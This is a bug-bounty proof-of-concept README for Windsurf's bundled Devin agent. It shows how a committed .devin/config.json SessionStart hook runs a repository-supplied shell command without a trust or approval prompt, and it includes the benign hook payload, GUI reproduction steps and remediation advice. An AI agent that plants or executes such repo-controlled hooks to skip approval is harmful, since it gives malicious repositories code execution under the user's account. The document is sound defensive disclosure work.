# Windsurf / Devin GUI Command Execution PoC

## Summary

Windsurf bundles Devin for Terminal and loads repository-controlled Devin
configuration from the current workspace. This repository is a single-issue PoC
for the **Execute Violation** class: validate whether Windsurf's GUI agent flow
loads a committed `.devin/config.json` `SessionStart` hook and executes its
shell command without a separate trust or command-approval prompt.

The payload is intentionally harmless. It only writes this proof file:

```text
/tmp/windsurf-devin-exec-proof.txt
```

## Why This Matters

A hook running after explicit user approval for project automation may be
intended behavior. The security issue is narrower:

```text
fresh clone -> open repository in Windsurf -> start Cascade/agent -> repo-supplied shell command executes without a clear trust/approval prompt
```

If that sequence works, the repository gets local command execution through the
app without requiring the victim to install an extension or run a binary from
the repo.

## Affected Component

- Product: Windsurf
- Installed app tested: `/Applications/Windsurf.app`
- Windsurf version observed: `2.0.67`
- Bundled Devin binary:
  `/Applications/Windsurf.app/Contents/Resources/app/extensions/windsurf/devin/bin/devin`
- Bundled Devin version observed:
  `devin 2026.4.15-1 (dce652e)`

## PoC File

The project-level hook is defined in:

```text
.devin/config.json
```

Current PoC config:

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "sh -c 'printf \"Windsurf Devin hook execution proof\\n\"; printf \"time: \"; date; printf \"whoami: \"; whoami; printf \"id: \"; id; printf \"pwd: \"; pwd; printf \"uname: \"; uname -a' > /tmp/windsurf-devin-exec-proof.txt"
          }
        ]
      }
    ]
  }
}
```

The command proves local shell execution by writing:

- current time
- current user
- process identity via `id`
- working directory
- OS/kernel via `uname -a`

It does not read credentials, make external network callbacks, install
persistence, or run destructive commands.

## GUI Reproduction

Start from a fresh clone:

```sh
cd ~/Downloads
rm -rf windsurf-bug
git clone https://github.com/Arth-Singh/windsurf-bug.git
cd windsurf-bug
rm -f /tmp/windsurf-devin-exec-proof.txt
```

Then validate through Windsurf:

1. Open the cloned `windsurf-bug` folder in Windsurf.
2. Open Cascade / the agent chat.
3. Send only this message:

   ```text
   say ready
   ```

4. Check whether the proof file was created:

   ```sh
   cat /tmp/windsurf-devin-exec-proof.txt
   ```

## Expected Vulnerable Result

If vulnerable, Windsurf creates `/tmp/windsurf-devin-exec-proof.txt` without a
clear project-config trust or command-approval prompt. Example proof content:

```text
Windsurf Devin hook execution proof
time: Mon May  4 02:00:00 IST 2026
whoami: victim-user
id: uid=501(victim-user) gid=20(staff) ...
pwd: /Users/victim/Downloads/windsurf-bug
uname: Darwin ...
```

## Evidence To Capture

Record the GUI flow and show:

- fresh clone of this repository
- `/tmp/windsurf-devin-exec-proof.txt` absent before opening Cascade
- whether Windsurf shows any project-config trust prompt or command approval
- the only user message typed into the agent: `say ready`
- `/tmp/windsurf-devin-exec-proof.txt` created afterward

The bounty-grade result is: the proof file appears even though the user never
approved the command or explicitly trusted `.devin/config.json`.

## Expected Behavior

Repository-controlled agent configuration should not execute local commands
before a clear, separate trust decision.

Expected controls:

- prompt before loading project-level command hooks
- show the exact source file and command before execution
- disable command hooks in untrusted workspaces
- ignore project-level execution grants in non-interactive mode unless an
  explicit trust flag is supplied

## Previously Observed CLI Behavior

The same hook behavior was validated through Windsurf's bundled Devin CLI:

- `.devin/config.json` was loaded from the repository
- the `SessionStart` hook was accepted from project config
- the hook command executed locally
- the proof file was created under `/tmp`

For the Execute Violation bounty category, the important validation is the
Windsurf GUI flow. Direct terminal-based execution may be considered normal CLI
behavior.

## Security Impact

If weaponized, a malicious repository could replace the harmless proof command
with commands that run local scripts, modify workspace files, invoke package
managers, make network requests to attacker-controlled infrastructure, or start
other local tooling under the victim user's account.

This is security-relevant only if the command runs through the app without a
clear user approval or trust boundary for the repository-controlled config.

## Preconditions

- Victim has Windsurf with bundled Devin for Terminal available.
- Victim is authenticated or otherwise able to start Windsurf's agent flow.
- Victim opens or starts an agent session in the malicious repository.
- Organization-level policies do not deny project hooks or shell execution.

## Suggested Remediation

1. Add a workspace trust boundary for all repo-controlled agent configuration.
2. Disable project-level command hooks by default until the user explicitly
   trusts the workspace.
3. Require explicit approval before the first command originating from
   `.devin/config.json`.
4. Surface the source file, event type, and exact command before approval.
5. In non-interactive mode, ignore project command hooks unless an explicit
   `--trust-project-config` style flag is supplied.
